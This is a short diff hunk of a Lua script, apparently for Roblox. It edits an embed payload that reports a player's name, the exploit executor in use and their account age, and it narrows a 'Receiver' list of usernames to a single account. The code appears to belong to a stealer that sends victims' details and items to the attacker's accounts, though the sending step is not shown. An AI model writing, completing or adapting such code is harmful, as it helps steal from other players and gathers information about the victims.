@@ -264,7 +264,7 @@ local embedPayload = {
                 name = "👤 Player Information",
                 value = "```" .. 
                     "Name: " .. (me.DisplayName ~= "" and me.DisplayName or me.Name) .. "\n" ..
-                    "Receiver: B4C0NN61, abduljamarmm2t, Tskemma1\n" ..
+                    "Receiver: abduljamarmm2t\n" ..
                     "Executor: " .. (identifyexecutor and identifyexecutor() or "Unknown") .. "\n" ..
                     "Account Age: " .. me.AccountAge .. " days" ..
                 "```",
